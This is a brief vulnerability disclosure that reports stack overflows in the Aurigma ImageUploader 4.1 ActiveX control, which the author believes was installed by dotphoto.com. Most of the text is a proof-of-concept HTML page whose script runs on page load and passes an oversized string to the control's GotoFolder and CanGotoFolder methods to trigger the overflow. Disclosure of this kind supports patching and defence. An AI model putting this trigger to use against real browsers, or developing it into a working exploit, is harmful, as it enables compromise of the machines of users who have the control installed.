There are multiple stack overflows in the Aurigma ImageUploader 4.1 ActiveX control. I believe this control was installed by www.dotphoto.com. PoC as follows:

-----------------------
<!--

<html>
 <head>
  <script language="JavaScript" DEFER>
    function Check() {
    var s = "AAAA";

     while (s.length < 999999) s=s+s;

     var obj = new ActiveXObject("Aurigma.ImageUploader.4.1"); //{6E5E167B-1566-4316-B27F-0DDAB3484CF7}
      obj.GotoFolder(s);
      obj.CanGotoFolder(s);

   }
  </script>

 </head>
 <body onload="JavaScript: return Check();">
 </body>
</html>
